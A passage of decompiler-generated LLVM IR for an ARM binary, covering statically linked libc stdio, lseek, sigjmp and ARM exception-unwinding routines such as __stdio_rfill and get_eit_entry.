dec_label_pc_183a4:                               ; preds = %dec_label_pc_18350, %dec_label_pc_18394
  %v0_183a4 = phi i32 [ %v2_183a0, %dec_label_pc_18394 ], [ %v0_183a4.pre, %dec_label_pc_18350 ]
  %v1_183a4 = load i32, i32* @r7, align 4
  %v2_183a4 = sub i32 %v1_183a4, %v0_183a4
  store i32 %v2_183a4, i32* @r7, align 4
  br label %dec_label_pc_183b4

dec_label_pc_183acthread-pre-split:               ; preds = %dec_label_pc_18304
  %v3_1831c = load i32, i32* @r6, align 4
  %v5_1831c = add i32 %v3_1831c, %v3_18314
  store i32 %v5_1831c, i32* @r6, align 4
  %v4_18320 = load i32, i32* @r5, align 4
  %v5_18320 = sub i32 %v4_18320, %v3_18314
  store i32 %v5_18320, i32* @r5, align 4
  %v2_183ac = icmp eq i32 %v5_18320, 0
  store i1 %v2_183ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_183ac, label %dec_label_pc_183b4, label %dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge

dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge: ; preds = %dec_label_pc_183acthread-pre-split
  %v3_18304.pre = load i32, i32* @r8, align 4
  %v0_18310.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18304

dec_label_pc_183b4:                               ; preds = %dec_label_pc_183acthread-pre-split, %entry, %bb21, %dec_label_pc_183a4
  %v0_183b4 = load i32, i32* @r7, align 4
  ret i32 %v0_183b4

; uselistorder directives
  uselistorder i32 %v5_18320, { 1, 3, 0, 2 }
  uselistorder i32 %v5_1831c, { 1, 0 }
  uselistorder i32 %v0_18394, { 1, 0 }
  uselistorder i32 %v1_1838c, { 0, 2, 1 }
  uselistorder i32 %v0_18388, { 1, 0 }
  uselistorder i32 %v0_183a4.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_18354, { 1, 0, 2 }
  uselistorder i32 %v2_18354, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_18314, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1830c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 15, 9, 10, 11, 22, 29, 30, 3, 12, 4, 13, 5, 14, 16, 17, 18, 6, 19, 0, 20, 21, 23, 24, 7, 25, 8, 26, 1, 27, 2, 28, 31 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_183b4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_183a4, { 1, 0 }
  uselistorder label %dec_label_pc_18394, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18350, { 1, 0 }
  uselistorder label %dec_label_pc_18304, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_183c4 = load i32, i32* @r4, align 4
  store i32 %v3_183c4, i32* %stack_var_-8, align 4
  %v1_183c8 = add i32 %arg1, 8
  %v1_183cc = inttoptr i32 %v1_183c8 to i32*
  %v2_183cc = load i32, i32* %v1_183cc, align 4
  store i32 %v2_183cc, i32* @r1, align 4
  %v3_183cc = add i32 %arg1, 12
  %v4_183cc = inttoptr i32 %v3_183cc to i32*
  %v5_183cc = load i32, i32* %v4_183cc, align 4
  %v2_183d0 = sub i32 %v5_183cc, %v2_183cc
  store i32 %v2_183d0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_183d8 = inttoptr i32 %arg1 to i16*
  %v4_183d8 = call i32 @__stdio_READ(i16* %v3_183d8, i32 %v2_183cc, i32 %v2_183d0)
  %v0_183dc = load i32, i32* @r4, align 4
  %v1_183dc = add i32 %v0_183dc, 8
  %v2_183dc = inttoptr i32 %v1_183dc to i32*
  %v3_183dc = load i32, i32* %v2_183dc, align 4
  store i32 %v3_183dc, i32* %r2.global-to-local, align 4
  %v2_183e0 = add i32 %v3_183dc, %v4_183d8
  %v2_183e4 = add i32 %v0_183dc, 20
  %v3_183e4 = inttoptr i32 %v2_183e4 to i32*
  store i32 %v2_183e0, i32* %v3_183e4, align 4
  %v0_183e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_183e8 = load i32, i32* @r4, align 4
  %v2_183e8 = add i32 %v1_183e8, 16
  %v3_183e8 = inttoptr i32 %v2_183e8 to i32*
  store i32 %v0_183e8, i32* %v3_183e8, align 4
  %v2_183ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_183ec, i32* @r4, align 4
  ret i32 %v4_183d8

; uselistorder directives
  uselistorder i32 %v4_183d8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_183f4 = load i32, i32* @r4, align 4
  store i32 %v3_183f4, i32* %stack_var_-12, align 4
  %v0_183f8 = load i32, i32* @r0, align 4
  %v1_183f8 = inttoptr i32 %v0_183f8 to i16*
  %v2_183f8 = load i16, i16* %v1_183f8, align 2
  %v3_183f8 = zext i16 %v2_183f8 to i32
  store i32 %v3_183f8, i32* %r3.global-to-local, align 4
  %v0_183fc = load i32, i32* @r1, align 4
  %v2_183fc = and i32 %v0_183fc, %v3_183f8
  %v4_183fc = icmp eq i32 %v2_183fc, 0
  store i32 %v0_183f8, i32* @r4, align 4
  br i1 %v4_183fc, label %dec_label_pc_1840c, label %dec_label_pc_1841c

dec_label_pc_1840c:                               ; preds = %entry
  %v1_1840c = and i32 %v3_183f8, 2176
  %v2_1840c = icmp eq i32 %v1_1840c, 0
  br i1 %v2_1840c, label %dec_label_pc_18414, label %dec_label_pc_18428

dec_label_pc_18414:                               ; preds = %dec_label_pc_1840c
  %v2_18414 = or i32 %v0_183fc, %v3_183f8
  store i32 %v2_18414, i32* %r3.global-to-local, align 4
  %v1_18418 = trunc i32 %v2_18414 to i16
  store i16 %v1_18418, i16* %v1_183f8, align 2
  %v0_1841c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1841c

dec_label_pc_1841c:                               ; preds = %entry, %dec_label_pc_18414
  %v0_1841c = phi i32 [ %v0_183f8, %entry ], [ %v0_1841c.pre, %dec_label_pc_18414 ]
  %v1_1841c = inttoptr i32 %v0_1841c to i16*
  %v2_1841c = load i16, i16* %v1_1841c, align 2
  %v3_1841c = zext i16 %v2_1841c to i32
  store i32 %v3_1841c, i32* %r3.global-to-local, align 4
  %v1_18420 = and i32 %v3_1841c, 16
  store i32 %v1_18420, i32* %r5.global-to-local, align 4
  %v2_18420 = icmp eq i32 %v1_18420, 0
  br i1 %v2_18420, label %dec_label_pc_18450, label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_1840c, %dec_label_pc_1841c
  store i32 40540, i32* %r3.global-to-local, align 4
  %v0_1842c = call i32 @__aeabi_read_tp()
  store i32 %v0_1842c, i32* %r0.global-to-local, align 4
  %v3_18430 = load i16, i16* @global_var_22294.357, align 2
  %v4_18430 = sext i16 %v3_18430 to i32
  store i32 %v4_18430, i32* %r3.global-to-local, align 4
  %v3_18438 = add i32 %v4_18430, %v0_1842c
  %v4_18438 = inttoptr i32 %v3_18438 to i32*
  store i32 9, i32* %v4_18438, align 4
  br label %dec_label_pc_1843c

dec_label_pc_1843c:                               ; preds = %dec_label_pc_18458, %dec_label_pc_18428
  %v0_1843c = load i32, i32* @r4, align 4
  %v1_1843c = inttoptr i32 %v0_1843c to i16*
  %v2_1843c = load i16, i16* %v1_1843c, align 2
  %v3_1843c = zext i16 %v2_1843c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18444 = or i32 %v3_1843c, 8
  store i32 %v1_18444, i32* %r3.global-to-local, align 4
  %v1_18448 = trunc i32 %v1_18444 to i16
  store i16 %v1_18448, i16* %v1_1843c, align 2
  %v1_18490.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18488

dec_label_pc_18450:                               ; preds = %dec_label_pc_1841c
  %v1_18450 = and i32 %v3_1841c, 64
  %v2_18450 = icmp eq i32 %v1_18450, 0
  br i1 %v2_18450, label %dec_label_pc_18478, label %dec_label_pc_18458

dec_label_pc_18458:                               ; preds = %dec_label_pc_18450
  %v0_18458 = load i32, i32* @r0, align 4
  %v1_18458 = call i32 @__stdio_wcommit(i32 %v0_18458)
  store i32 %v1_18458, i32* %r0.global-to-local, align 4
  %v2_1845c = icmp eq i32 %v1_18458, 0
  br i1 %v2_1845c, label %dec_label_pc_18464, label %dec_label_pc_1843c

dec_label_pc_18464:                               ; preds = %dec_label_pc_18458
  %v0_18464 = load i32, i32* @r4, align 4
  %v1_18464 = inttoptr i32 %v0_18464 to i16*
  %v2_18464 = load i16, i16* %v1_18464, align 2
  %v3_18464 = zext i16 %v2_18464 to i32
  store i32 %v3_18464, i32* %r3.global-to-local, align 4
  %v1_18468 = add i32 %v0_18464, 8
  %v2_18468 = inttoptr i32 %v1_18468 to i32*
  %v3_18468 = load i32, i32* %v2_18468, align 4
  %v1_1846c = and i32 %v3_18464, 65471
  store i32 %v1_1846c, i32* %r3.global-to-local, align 4
  %v2_18470 = add i32 %v0_18464, 28
  %v3_18470 = inttoptr i32 %v2_18470 to i32*
  store i32 %v3_18468, i32* %v3_18470, align 4
  %v0_18474 = load i32, i32* %r3.global-to-local, align 4
  %v1_18474 = trunc i32 %v0_18474 to i16
  %v2_18474 = load i32, i32* @r4, align 4
  %v3_18474 = inttoptr i32 %v2_18474 to i16*
  store i16 %v1_18474, i16* %v3_18474, align 2
  %v0_18478.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18478

dec_label_pc_18478:                               ; preds = %dec_label_pc_18450, %dec_label_pc_18464
  %v2_18480 = phi i32 [ %v0_1841c, %dec_label_pc_18450 ], [ %v0_18478.pre, %dec_label_pc_18464 ]
  %v1_18478 = inttoptr i32 %v2_18480 to i16*
  %v2_18478 = load i16, i16* %v1_18478, align 2
  %v3_18478 = zext i16 %v2_18478 to i32
  %v1_1847c = or i32 %v3_18478, 1
  store i32 %v1_1847c, i32* %r3.global-to-local, align 4
  %v1_18480 = trunc i32 %v1_1847c to i16
  store i16 %v1_18480, i16* %v1_18478, align 2
  %v0_18484 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18484, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18488

dec_label_pc_18488:                               ; preds = %dec_label_pc_1843c, %dec_label_pc_18478
  %v1_18490 = phi i32 [ %v1_18490.pre, %dec_label_pc_1843c ], [ %v0_18484, %dec_label_pc_18478 ]
  %v2_1848c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1848c, i32* @r4, align 4
  ret i32 %v1_18490

; uselistorder directives
  uselistorder i32 %v3_183f8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18488, { 1, 0 }
  uselistorder label %dec_label_pc_18478, { 1, 0 }
  uselistorder label %dec_label_pc_18428, { 1, 0 }
  uselistorder label %dec_label_pc_1841c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_18498 = load i32, i32* @r4, align 4
  %v6_18498 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_184a8 = call i32 @memcpy()
  %v0_184ac = load i32, i32* @r5, align 4
  %v1_184ac = load i32, i32* @r4, align 4
  %v2_184ac = add i32 %v1_184ac, %v0_184ac
  store i32 %v3_18498, i32* @r4, align 4
  store i32 %v6_18498, i32* @r5, align 4
  ret i32 %v2_184ac
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_184bc = load i32, i32* @r1, align 4
  %v2_184bc = icmp eq i32 %v0_184bc, 0
  %v3_184c0 = load i32, i32* @r4, align 4
  store i32 %v3_184c0, i32* %stack_var_-8, align 4
  %v0_184c4 = load i32, i32* @r0, align 4
  store i32 %v0_184c4, i32* %r4.global-to-local, align 4
  br i1 %v2_184bc, label %dec_label_pc_184e8, label %dec_label_pc_184cc

dec_label_pc_184cc:                               ; preds = %entry
  %v1_184d4 = add i32 %v0_184c4, 260
  %v4_184d8 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_184d4)
  %v2_184dc = icmp eq i32 %v4_184d8, 0
  br i1 %v2_184dc, label %dec_label_pc_184ec, label %dec_label_pc_184e8

dec_label_pc_184e8:                               ; preds = %dec_label_pc_184cc, %entry
  br label %dec_label_pc_184ec

dec_label_pc_184ec:                               ; preds = %dec_label_pc_184cc, %dec_label_pc_184e8
  %storemerge = phi i32 [ 0, %dec_label_pc_184e8 ], [ 1, %dec_label_pc_184cc ]
  %v1_184f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_184f0 = add i32 %v1_184f0, 256
  %v3_184f0 = inttoptr i32 %v2_184f0 to i32*
  store i32 %storemerge, i32* %v3_184f0, align 4
  %v2_184f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_184f4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 3, 24, 4, 25 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_184ec, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_18544, label %dec_label_pc_18528

dec_label_pc_18528:                               ; preds = %entry
  %v0_1852c = call i32 @__aeabi_read_tp()
  %v3_18530 = load i16, i16* @global_var_22294.357, align 2
  %v4_18530 = sext i16 %v3_18530 to i32
  %v0_18534 = load i32, i32* %r2.global-to-local, align 4
  %v1_18534 = sub i32 0, %v0_18534
  store i32 %v1_18534, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1853c = add i32 %v4_18530, %v0_1852c
  %v4_1853c = inttoptr i32 %v3_1853c to i32*
  store i32 %v1_18534, i32* %v4_1853c, align 4
  %v0_1854c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1854c

dec_label_pc_18544:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_18544 = icmp eq i32 %arg1, 0
  br i1 %v2_18544, label %dec_label_pc_18558, label %dec_label_pc_1854c

dec_label_pc_1854c:                               ; preds = %dec_label_pc_18544, %dec_label_pc_18528
  %v0_1854c = phi i32 [ %arg1, %dec_label_pc_18544 ], [ %v0_1854c.pre, %dec_label_pc_18528 ]
  %v3_18550 = ashr i32 %v0_1854c, 31
  br label %dec_label_pc_1855c

dec_label_pc_18558:                               ; preds = %dec_label_pc_18544
  br label %dec_label_pc_1855c

dec_label_pc_1855c:                               ; preds = %dec_label_pc_1854c, %dec_label_pc_18558
  %v1_18564 = phi i32 [ %v0_1854c, %dec_label_pc_1854c ], [ %tmp8, %dec_label_pc_18558 ]
  %storemerge = phi i32 [ %v3_18550, %dec_label_pc_1854c ], [ %tmp, %dec_label_pc_18558 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_18564

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 13, 6, 7, 0, 8, 4, 9, 1, 10, 2, 11, 3, 12, 14, 15, 5 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_22294.357, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 65, 71, 70, 16, 64, 80, 79, 68, 69, 67, 66, 78, 77, 76, 75, 74, 73, 72, 19, 27, 29, 35, 63, 44, 43, 12, 6, 5, 11, 26, 25, 10, 3, 2, 13, 9, 8, 7, 49, 15, 24, 48, 47, 28, 21, 23, 22, 60, 59, 32, 31, 30, 33, 34, 58, 46, 57, 56, 18, 17, 55, 20, 62, 61, 42, 39, 38, 37, 45, 4, 54, 53, 36, 52, 14, 51, 50, 0, 1, 41, 40 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1855c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1856c = icmp eq i32 %regclass, 0
  br i1 %v2_1856c, label %dec_label_pc_18574, label %dec_label_pc_185a4

dec_label_pc_18574:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18574
  %v6_18578 = icmp eq i32 %representation, 0
  br i1 %v6_18578, label %dec_label_pc_18588, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18574
  br label %dec_label_pc_185b0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_185b0

dec_label_pc_18588:                               ; preds = %bb
  %v3_18588 = mul i32 %regno, 4
  %v2_1858c = add i32 %v3_18588, %context
  %v1_18590 = add i32 %v2_1858c, 4
  %v2_18590 = inttoptr i32 %v1_18590 to i32*
  %v3_18590 = load i32, i32* %v2_18590, align 4
  %v2_1859c = bitcast i8* %valuep to i32*
  store i32 %v3_18590, i32* %v2_1859c, align 4
  ret i32 0

dec_label_pc_185a4:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_185a4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_185a4, %bb9
  %v0_185ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_185ac)
  br label %dec_label_pc_185b0

dec_label_pc_185b0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_185b0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_185b8 = icmp eq i32 %regclass, 0
  br i1 %v2_185b8, label %dec_label_pc_185c0, label %dec_label_pc_185f0

dec_label_pc_185c0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_185c0
  %v6_185c4 = icmp eq i32 %representation, 0
  br i1 %v6_185c4, label %dec_label_pc_185d4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_185c0
  br label %dec_label_pc_185fc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_185fc

dec_label_pc_185d4:                               ; preds = %bb
  %v3_185d8 = mul i32 %regno, 4
  %v1_185dc = bitcast i8* %valuep to i32*
  %v2_185dc = load i32, i32* %v1_185dc, align 4
  %v2_185e0 = add i32 %v3_185d8, %context
  %v2_185e8 = add i32 %v2_185e0, 4
  %v3_185e8 = inttoptr i32 %v2_185e8 to i32*
  store i32 %v2_185dc, i32* %v3_185e8, align 4
  ret i32 0

dec_label_pc_185f0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_185f0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_185f0, %bb9
  %v0_185f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_185f8)
  br label %dec_label_pc_185fc

dec_label_pc_185fc:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_185fc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_18604 = add i32 %context, 68
  %v2_18604 = inttoptr i32 %v1_18604 to i32*
  %v3_18604 = load i32, i32* %v2_18604, align 4
  ret i32 %v3_18604

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_18614 = add i32 %exc, 8
  %v2_18614 = inttoptr i32 %v1_18614 to i32*
  %v3_18614 = load i32, i32* %v2_18614, align 4
  %v2_18618 = icmp eq i32 %v3_18614, 0
  br i1 %v2_18618, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_1862c = xor i1 %v2_18618, true
  call void @__pseudo_cond_branch(i1 %v2_1862c, i32 %v3_18614)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18644 = call i32 @abort()
  ret i32 %v0_18644
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18650 = call i32 @abort()
  ret i32 %v0_18650
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_18654 = load i32, i32* @r4, align 4
  store i32 %v3_18654, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r5.global-to-local, align 4
  %v4_18664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 132) to i32*), align 4
  %v2_18668 = icmp eq i32 %v4_18664, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_18674 = add i32 %return_address, -2
  store i32 %v1_18674, i32* %r4.global-to-local, align 4
  br i1 %v2_18668, label %dec_label_pc_186ac, label %dec_label_pc_1867c

dec_label_pc_1867c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18664)
  %v2_1868c = icmp eq i32 %v1_18674, 0
  br i1 %v2_1868c, label %.thread, label %dec_label_pc_186ccthread-pre-split

.thread:                                          ; preds = %dec_label_pc_1867c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_18694 = load i32, i32* %r6.global-to-local, align 4
  %v3_18694 = add i32 %v2_18694, 16
  %v4_18694 = inttoptr i32 %v3_18694 to i32*
  store i32 0, i32* %v4_18694, align 4
  br label %dec_label_pc_1869c

dec_label_pc_1869c:                               ; preds = %.thread, %.thread10, %dec_label_pc_18844, %dec_label_pc_18830, %dec_label_pc_1880c, %dec_label_pc_187e4, %dec_label_pc_186e4
  %v0_1869c = load i32, i32* %r2.global-to-local, align 4
  %v2_186a4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_186a4, i32* @r4, align 4
  ret i32 %v0_1869c

dec_label_pc_186ac:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_186b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 20) to i32*), align 4
  %v4_186b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 48) to i32*), align 4
  store i32 %v4_186b8, i32* %r2.global-to-local, align 4
  %v2_186bc = sub i32 %v4_186b4, %v4_186b8
  %v3_186c0 = sdiv i32 %v2_186bc, 8
  store i32 %v3_186c0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_186cc

dec_label_pc_186ccthread-pre-split:               ; preds = %dec_label_pc_1867c
  %v3_186cc.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_186cc

dec_label_pc_186cc:                               ; preds = %dec_label_pc_186ccthread-pre-split, %dec_label_pc_186ac
  %v0_18710.pre = phi i32 [ %v1_18674, %dec_label_pc_186ccthread-pre-split ], [ %v4_186b8, %dec_label_pc_186ac ]
  %v1_186d4 = phi i32 [ %v3_186cc.pr, %dec_label_pc_186ccthread-pre-split ], [ %v3_186c0, %dec_label_pc_186ac ]
  %v2_186d0 = icmp eq i32 %v1_186d4, 0
  br i1 %v2_186d0, label %dec_label_pc_186e4, label %dec_label_pc_18700.preheader

dec_label_pc_18700.preheader:                     ; preds = %dec_label_pc_186cc
  %v2_186d4 = add i32 %v1_186d4, -1
  %v1_18730 = add i32 %v0_18710.pre, 8
  br label %dec_label_pc_18700.outer

dec_label_pc_186e4.loopexit:                      ; preds = %dec_label_pc_1875c
  br label %dec_label_pc_186e4

dec_label_pc_186e4:                               ; preds = %dec_label_pc_186e4.loopexit, %dec_label_pc_186cc, %dec_label_pc_18828
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_186ec = load i32, i32* %r6.global-to-local, align 4
  %v2_186ec = add i32 %v1_186ec, 16
  %v3_186ec = inttoptr i32 %v2_186ec to i32*
  store i32 0, i32* %v3_186ec, align 4
  br label %dec_label_pc_1869c

dec_label_pc_186f4:                               ; preds = %dec_label_pc_18750
  %v3_186f4 = icmp ult i32 %storemerge40, %v0_18754
  br i1 %v3_186f4, label %dec_label_pc_186fc, label %dec_label_pc_1876c

dec_label_pc_186fc:                               ; preds = %dec_label_pc_186f4
  %v1_186fc = add nsw i32 %v3_18708, 1
  br label %dec_label_pc_18700.outer

dec_label_pc_18700.outer:                         ; preds = %dec_label_pc_186fc, %dec_label_pc_18700.preheader
  %v1_1875c.ph = phi i32 [ %v1_186fc, %dec_label_pc_186fc ], [ 0, %dec_label_pc_18700.preheader ]
  %v0_18700.ph = phi i32 [ %v0_18700, %dec_label_pc_186fc ], [ %v2_186d4, %dec_label_pc_18700.preheader ]
  br label %dec_label_pc_18700

dec_label_pc_18700:                               ; preds = %dec_label_pc_18700.outer, %dec_label_pc_18764
  %v0_18700 = phi i32 [ %v1_18764, %dec_label_pc_18764 ], [ %v0_18700.ph, %dec_label_pc_18700.outer ]
  %v2_18700 = add i32 %v0_18700, %v1_1875c.ph
  %tmp = icmp slt i32 %v2_18700, 0
  %v4_18704 = zext i1 %tmp to i32
  %v5_18704 = add i32 %v4_18704, %v2_18700
  %v3_18708 = sdiv i32 %v5_18704, 2
  %v3_1870c = mul i32 %v3_18708, 8
  store i32 %v3_1870c, i32* @ip, align 4
  %v2_18710 = add i32 %v3_1870c, %v0_18710.pre
  %v3_18710 = inttoptr i32 %v2_18710 to i32*
  %v4_18710 = load i32, i32* %v3_18710, align 4
  %v1_18714 = and i32 %v4_18710, 1073741824
  %v2_18714 = icmp eq i32 %v1_18714, 0
  %v2_18718 = or i32 %v4_18710, -2147483648
  %tmp79 = bitcast i32 %v4_18710 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1871c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_18714, i32 %v2_1871c, i32 %v2_18718
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_18720 = icmp eq i32 %v2_186d4, %v3_18708
  store i32 %v2_18710, i32* %r7.global-to-local, align 4
  br i1 %v9_18720, label %dec_label_pc_18750, label %dec_label_pc_18730

dec_label_pc_18730:                               ; preds = %dec_label_pc_18700
  %v2_18734 = add i32 %v3_1870c, %v1_18730
  %v3_18734 = inttoptr i32 %v2_18734 to i32*
  %v4_18734 = load i32, i32* %v3_18734, align 4
  %v1_1873c = and i32 %v4_18734, 1073741824
